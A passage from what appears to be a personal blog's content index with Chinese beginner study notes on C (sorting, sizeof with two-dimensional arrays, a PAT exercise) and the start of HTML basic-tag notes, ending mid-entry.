function_">test</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> arr[] = &#123; <span class="number">1</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="number">0</span>,<span class="number">9</span> &#125;;</span><br><span class="line">    <span class="type">int</span> sz = <span class="keyword">sizeof</span>(arr) / <span class="keyword">sizeof</span>(arr[<span class="number">0</span>]);</span><br><span class="line">    bubble_sort(arr, sz, <span class="keyword">sizeof</span>(arr[<span class="number">0</span>]), cmp_int);</span><br><span class="line">    print_arr(arr, sz);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    test();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><h2 id="折半排序"><a href="#折半排序" class="headerlink" title="折半排序"></a>折半排序</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">CelerityRun</span><span class="params">(<span class="type">int</span> left, <span class="type">int</span> right, <span class="type">int</span> <span class="built_in">array</span>[])</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="type">int</span> a[<span class="number">10</span>];</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;a[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    CelerityRun(<span class="number">0</span>, <span class="number">9</span>, a);</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\t&quot;</span>, a[i]);</span><br><span class="line">        <span class="keyword">if</span>(i == <span class="number">4</span>)</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">CelerityRun</span><span class="params">(<span class="type">int</span> left, <span class="type">int</span> right, <span class="type">int</span> <span class="built_in">array</span>[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i,j;</span><br><span class="line">    <span class="type">int</span> middle,iTemp;</span><br><span class="line">    i = left;</span><br><span class="line">    j = right;</span><br><span class="line">    middle = <span class="built_in">array</span>[(left+right) / <span class="number">2</span>]; <span class="comment">//求中间值 </span></span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">while</span>((<span class="built_in">array</span>[i] &lt; middle) &amp;&amp; (i &lt; right)) <span class="comment">//从左找小于中间值的数 </span></span><br><span class="line">            i++;</span><br><span class="line">        <span class="keyword">while</span>((<span class="built_in">array</span>[j] &gt; middle) &amp;&amp; (j &gt; left)) <span class="comment">//从右找大于中间值的数 </span></span><br><span class="line">            j--;</span><br><span class="line">        <span class="keyword">if</span> (i &lt;= j)</span><br><span class="line">        &#123;</span><br><span class="line">            iTemp = <span class="built_in">array</span>[i];</span><br><span class="line">            <span class="built_in">array</span>[i] = <span class="built_in">array</span>[j];</span><br><span class="line">            <span class="built_in">array</span>[j] = iTemp;</span><br><span class="line">            i++;</span><br><span class="line">            j--;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">while</span>(i &lt;= j);</span><br><span class="line">    <span class="comment">/* 递归左半边 */</span></span><br><span class="line">    <span class="keyword">if</span> (left &lt; j)</span><br><span class="line">        CelerityRun(left, j, <span class="built_in">array</span>);</span><br><span class="line">    <span class="comment">/* 递归右半边 */</span> </span><br><span class="line">    <span class="keyword">if</span> (right &gt; i)</span><br><span class="line">        CelerityRun(i, right, <span class="built_in">array</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/03/19/WOIY92Lg7FAVKlo.png" alt="image.png"></p><h2 id="二维数组"><a href="#二维数组" class="headerlink" title="二维数组"></a>二维数组</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> a[<span class="number">3</span>][<span class="number">4</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, (<span class="type">int</span>)<span class="keyword">sizeof</span>(a));<span class="comment">//48=3*4*sizeof(int) </span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, (<span class="type">int</span>)<span class="keyword">sizeof</span>(a[<span class="number">0</span>][<span class="number">0</span>]));<span class="comment">//4 - a[0][0]-是第一行第一个元素 </span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, (<span class="type">int</span>)<span class="keyword">sizeof</span>(a[<span class="number">0</span>]));<span class="comment">//16 第一行 4*4个int </span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, (<span class="type">int</span>)<span class="keyword">sizeof</span>(a[<span class="number">0</span>]+<span class="number">1</span>));<span class="comment">//4</span></span><br><span class="line">                                         <span class="comment">/*a[0]作为数组名并没有单独放在sizeof内部 </span></span><br><span class="line"><span class="comment">                                         *也没取地址，所以a[0]是第一行第一个算的地址 </span></span><br><span class="line"><span class="comment">                                         *a[0]+1，就是第一行第二个元素的地址 </span></span><br><span class="line"><span class="comment">                                         *</span></span><br><span class="line"><span class="comment">                                         */</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, (<span class="type">int</span>)<span class="keyword">sizeof</span>(*(a[<span class="number">0</span>]+<span class="number">1</span>)));<span class="comment">//*(a[0]+1)==a[0][1] int 4 byte 第一行第二个元素 </span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, (<span class="type">int</span>)<span class="keyword">sizeof</span>(a+<span class="number">1</span>));<span class="comment">//4/8  a是首元素地址，而二维数组数组名的首元素是第一行，</span></span><br><span class="line">                                     <span class="comment">//第一行的地址+1就是第二行的地址 </span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, (<span class="type">int</span>)<span class="keyword">sizeof</span>(*(a+<span class="number">1</span>)));<span class="comment">//16 对第二行解引用，有4个元素， </span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, (<span class="type">int</span>)<span class="keyword">sizeof</span>(&amp;a[<span class="number">0</span>]+<span class="number">1</span>));<span class="comment">//4/8 第一行的地址+1就是第二行的地址 </span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, (<span class="type">int</span>)<span class="keyword">sizeof</span>(*(&amp;a[<span class="number">0</span>]+<span class="number">1</span>)));<span class="comment">//16 第二行解引用 </span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, (<span class="type">int</span>)<span class="keyword">sizeof</span>(*a));<span class="comment">//16 首元素即第一行地址，再解引用 ，没有&amp;没有单独放在sizeof内部 </span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, (<span class="type">int</span>)<span class="keyword">sizeof</span>(a[<span class="number">3</span>]));<span class="comment">//16 a[3]其实是第四行的数组名，（如果有的话）</span></span><br><span class="line">                                      <span class="comment">// 所以其实不存在，但是也能通过类型计算大小 </span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/03/25/p3ZUYXCMebPDJ2o.png" alt="image.png"><br>3+5<br>表达式</p><ol><li>值属性 8</li><li>类型性 int</li><li>a[3属]的类型 - int [4]</li></ol><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">short</span> s = <span class="number">5</span>;</span><br><span class="line">    <span class="type">int</span> a = <span class="number">4</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, <span class="keyword">sizeof</span>(s = a + <span class="number">6</span>));<span class="comment">//2 由s决定 </span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, s);<span class="comment">//5  sizeof内部的表达式不会计算,只看类型</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><h4 id="总结：数组名的意义"><a href="#总结：数组名的意义" class="headerlink" title="总结：数组名的意义"></a>总结：数组名的意义</h4><ol><li>sizeof(数组名)，这里的数组名表示整个数组，计算的是整个数组的大小</li><li>&amp;数组名，这里的数组名表示整个数组，取出的是整个数组的地址</li><li>除此之外所有的数组名都表示首元素的地址</li></ol><h2 id="PAT-答题卡"><a href="#PAT-答题卡" class="headerlink" title="PAT 答题卡"></a>PAT 答题卡</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">Iswhat</span><span class="params">(<span class="type">char</span> a[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> flag = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> len = <span class="built_in">strlen</span>(a);</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (a[i] == <span class="string">&#x27;;&#x27;</span>)&#123;</span><br><span class="line">            flag = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (a[i] == <span class="string">&#x27;/&#x27;</span>)&#123;</span><br><span class="line">            flag = <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> flag;</span><br><span class="line"> &#125; </span><br><span class="line"> <span class="type">void</span> <span class="title function_">init</span><span class="params">(<span class="type">char</span> s[])</span></span><br><span class="line"> &#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> len = <span class="built_in">strlen</span>(s);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">        s[i] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> n ,m, x, y;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> j = <span class="number">0</span>;</span><br><span class="line">    <span class="type">char</span> s[<span class="number">6</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="type">char</span> a[<span class="number">90</span>][<span class="number">90</span>] = &#123;&#125;;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>, &amp;n, &amp;m);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; n; j++)</span><br><span class="line">            a[i][j] = <span class="string">&#x27;.&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">        init(s);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, &amp;s);</span><br><span class="line">        <span class="keyword">if</span> (Iswhat(s) == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">//printf(&quot;%s &quot;, s);</span></span><br><span class="line">            <span class="type">int</span> len = <span class="built_in">strlen</span>(s);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, len);</span><br><span class="line">            <span class="keyword">if</span> (len == <span class="number">1</span>) &#123;</span><br><span class="line">                x = <span class="number">0</span>;</span><br><span class="line">                y = <span class="type">int</span>(s[len - <span class="number">1</span>] - <span class="string">&#x27;0&#x27;</span>) - <span class="number">1</span>;</span><br><span class="line">                 </span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (len == <span class="number">2</span>) &#123;</span><br><span class="line">                x = <span class="number">0</span>;</span><br><span class="line">                y = <span class="type">int</span>(s[len - <span class="number">2</span>] - <span class="string">&#x27;0&#x27;</span>) * <span class="number">10</span> + <span class="type">int</span>(s[len - <span class="number">1</span>] - <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (len == <span class="number">3</span>) &#123;</span><br><span class="line">                x = <span class="type">int</span>(s[len - <span class="number">3</span>] - <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">                y = <span class="type">int</span>(s[len - <span class="number">2</span>] - <span class="string">&#x27;0&#x27;</span>) * <span class="number">10</span> + <span class="type">int</span>(s[len - <span class="number">1</span>] - <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                x = <span class="type">int</span>(s[len - <span class="number">4</span>] - <span class="string">&#x27;0&#x27;</span>) * <span class="number">10</span> + <span class="type">int</span>(s[len - <span class="number">3</span>] - <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">                y = <span class="type">int</span>(s[len - <span class="number">2</span>] - <span class="string">&#x27;0&#x27;</span>) * <span class="number">10</span> + <span class="type">int</span>(s[len - <span class="number">1</span>] - <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//printf(&quot;%d %d\n&quot;, x, y);</span></span><br><span class="line">            a[n - y][x - <span class="number">1</span>] = <span class="string">&#x27;#&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (Iswhat(s) == <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="type">int</span> len = <span class="built_in">strlen</span>(s);</span><br><span class="line">            <span class="keyword">if</span>(len == <span class="number">5</span>) &#123;</span><br><span class="line">                x = <span class="type">int</span>(s[len - <span class="number">5</span>] - <span class="string">&#x27;0&#x27;</span>) * <span class="number">10</span> + <span class="type">int</span>(s[len - <span class="number">4</span>] - <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">                y = <span class="type">int</span>(s[len - <span class="number">2</span>] - <span class="string">&#x27;0&#x27;</span>) * <span class="number">10</span> + <span class="type">int</span>(s[len - <span class="number">1</span>] - <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(len == <span class="number">3</span>) &#123;</span><br><span class="line">                x = <span class="type">int</span>(s[len - <span class="number">3</span>] - <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">                y = <span class="type">int</span>(s[len - <span class="number">1</span>] - <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="type">int</span> index = <span class="number">0</span>;</span><br><span class="line">                <span class="type">int</span> j = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; len; j++) &#123;</span><br><span class="line">                    <span class="keyword">if</span>(s[j] == <span class="string">&#x27;;&#x27;</span>) &#123;</span><br><span class="line">                        index = j;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; </span><br><span class="line">                <span class="keyword">if</span> (index == <span class="number">2</span>) &#123;</span><br><span class="line">                    x = <span class="type">int</span>(s[len - <span class="number">4</span>] - <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">                    y = <span class="type">int</span>(s[len - <span class="number">2</span>] - <span class="string">&#x27;0&#x27;</span>) * <span class="number">10</span> + <span class="type">int</span>(s[len - <span class="number">1</span>] - <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> &#123;</span><br><span class="line">                    x = <span class="type">int</span>(s[len - <span class="number">4</span>] - <span class="string">&#x27;0&#x27;</span>) * <span class="number">10</span> + <span class="type">int</span>(s[len - <span class="number">3</span>] - <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">                    y = <span class="type">int</span>(s[len - <span class="number">1</span>] - <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            a[n - y][x - <span class="number">1</span>] = <span class="string">&#x27;#&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">int</span> len = <span class="built_in">strlen</span>(s);</span><br><span class="line">            <span class="keyword">if</span>(len == <span class="number">5</span>) &#123;</span><br><span class="line">                x = <span class="type">int</span>(s[len - <span class="number">5</span>] - <span class="string">&#x27;0&#x27;</span>) * <span class="number">10</span> + <span class="type">int</span>(s[len - <span class="number">4</span>] - <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">                y = <span class="type">int</span>(s[len - <span class="number">2</span>] - <span class="string">&#x27;0&#x27;</span>) * <span class="number">10</span> + <span class="type">int</span>(s[len - <span class="number">1</span>] - <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(len == <span class="number">3</span>) &#123;</span><br><span class="line">                x = <span class="type">int</span>(s[len - <span class="number">3</span>] - <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">                y = <span class="type">int</span>(s[len - <span class="number">1</span>] - <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="type">int</span> index = <span class="number">0</span>;</span><br><span class="line">                <span class="type">int</span> j = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; len; j++) &#123;</span><br><span class="line">                    <span class="keyword">if</span>(s[j] == <span class="string">&#x27;/&#x27;</span>) &#123;</span><br><span class="line">                        index = j;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; </span><br><span class="line">                <span class="keyword">if</span> (index == <span class="number">2</span>) &#123;</span><br><span class="line">                    x = <span class="type">int</span>(s[len - <span class="number">4</span>] - <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">                    y = <span class="type">int</span>(s[len - <span class="number">2</span>] - <span class="string">&#x27;0&#x27;</span>) * <span class="number">10</span> + <span class="type">int</span>(s[len - <span class="number">1</span>] - <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> &#123;</span><br><span class="line">                    x = <span class="type">int</span>(s[len - <span class="number">4</span>] - <span class="string">&#x27;0&#x27;</span>) * <span class="number">10</span> + <span class="type">int</span>(s[len - <span class="number">3</span>] - <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">                    y = <span class="type">int</span>(s[len - <span class="number">1</span>] - <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            a[n - y][x - <span class="number">1</span>] = <span class="string">&#x27;#&#x27;</span>;  </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; n; j++)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, a[i][j]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"> &#125; </span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> C </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>html学习笔记</title>
      <link href="/2023/03/03/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/2023/03/03/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="第一步：安装好要用的编辑器"><a href="#第一步：安装好要用的编辑器" class="headerlink" title="第一步：安装好要用的编辑器"></a>第一步：安装好要用的编辑器</h1><p>我这里用的是Sublime Text</p><p>我自己看的学习视频 <a href="https://www.bilibili.com/video/BV11t411K74Q/?spm_id_from=333.1007.top_right_bar_window_history.content.click&vd_source=3ae03810e5d4ba6e6b93c5edd6c76912">HTML学习视频</a>。</p><h1 id="第二步：新建HTML文件"><a href="#第二步：新建HTML文件" class="headerlink" title="第二步：新建HTML文件"></a>第二步：新建HTML文件</h1><p><em>在用Sublime Text编写html文件时会自动补全.</em></p><h2 id="我的第一个HTML"><a href="#我的第一个HTML" class="headerlink" title="我的第一个HTML"></a>我的第一个HTML</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">1、这是HTML的注释</span></span><br><span class="line"><span class="comment">2、支持多行注释</span></span><br><span class="line"><span class="comment">3、不区分大小写，语法松散不严格</span></span><br><span class="line"><span class="comment">4、但最好还是按结构写</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="meta">&lt;!doctype <span class="keyword">html</span>&gt;</span> <span class="comment">&lt;!--加上这句话就是H5，去掉则是H4.0--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--根--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"> <span class="comment">&lt;!--头部--&gt;</span>   <span class="comment">&lt;!--注意缩进--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>网页的标题<span class="tag">&lt;/<span class="name">title</span>&gt;</span> <span class="comment">&lt;!--显示在标签页一栏--&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span> <span class="comment">&lt;!--主体--&gt;</span></span><br><span class="line">网页的主体内容,和老杜学习HTML</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span> <span class="comment">&lt;!--大小写无所谓--&gt;</span></span><br></pre></td></tr></table></figure><p><a href="https://postimg.cc/hhCXWfC8"><img src="https://i.postimg.cc/7Y40zz0R/1.png" alt="1.png"></a></p><h2 id="基本标签"><a href="#基本标签" class="headerlink" title="基本标签"></a>基本标签</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span> <span class="comment">&lt;!--&lt;mata&gt;标签永远位于head元素内部，这里加上</span></span><br><span class="line"><span class="comment">charset属性是为了规定 HTML 文档的字符编码。--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--name属性中的viewport表示页面视图的属性下面设置是为了让网页的宽度自动适应，initial-scale:控制页面最初加载时的在在idealviewport下缩放等级，通常设为1，可以是小数--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>HTML基本标签<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--段落标记--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>《三国演义》是罗贯中在有关三国故事的宋元话本、戏曲和轶事传闻的基础上，依据晋代陈寿所著的《三国志》以及南朝宋人裴松之为《三国志》所作的注，所进行的加工再创作。<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span>该作品成书后有嘉靖壬午本等多个版本传于世，到了明末清初，毛宗岗对《三国演义》整顿回目、修正文辞、改换诗文，该版本也成为诸多版本中水平最高、流传最广的版本。<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--标题字,是HTML的预留字，和word中的标题字一样--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>标题字<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>标题字<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h3</span>&gt;</span>标题字<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h4</span>&gt;</span>标题字<span class="tag">&lt;/<span class="name">h4</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h5</span>&gt;</span>标题字<span class="tag">&lt;/<span class="name">h5</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h6</span>&gt;</span>标题字<span class="tag">&lt;/<span class="name">h6</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--最多六个--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--换行--&gt;</span><span class="comment">&lt;!--&lt;br&gt;是独目标记--&gt;</span></span><br><span class="line">hello </span><br><span class="line">world!</span><br><span class="line">hello<span class="tag">&lt;<span class="name">br</span>&gt;</span> world1</span><br><span class="line"></span><br><span class="line">&lt;！--横线(独目)--&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">hr</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--color和width都是hr标签的属性--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">hr</span> <span class="attr">color</span>=<span class="string">&quot;red&quot;</span> <span class="attr">width</span>=<span class="string">&quot;50%&quot;</span>&gt;</span><span class="comment">&lt;!--单双引号没有要求但一定要写--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--预留格式(否则都在一条直线上)--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">pre</span>&gt;</span></span><br><span class="line">for(int i = 0; i &lt; 10; i++)&#123;</span><br><span class="line">printf(&quot;NB&quot;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">pre</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">del</span>&gt;</span>删除字<span class="tag">&lt;/<span class="name">del</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ins</span>&gt;</span>插入字<span class="tag">&lt;/<span class="name">ins</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">b</span>&gt;</span>粗体字<span class="tag">&lt;/<span class="name">b</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">i</span>&gt;</span>斜体字<span class="tag">&lt;/<span class="name">i</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--10的平方--&gt;</span></span><br><span class="line">10<span class="tag">&lt;<span class="name">sup</span>&gt;</span>2<span class="tag">&lt;/<span class="name">sup</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--角标--&gt;</span></span><br><span class="line">10<span class="tag">&lt;<span class="name">sub</span>&gt;</span>m<span class="tag">&lt;/<span class="name">sub</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span 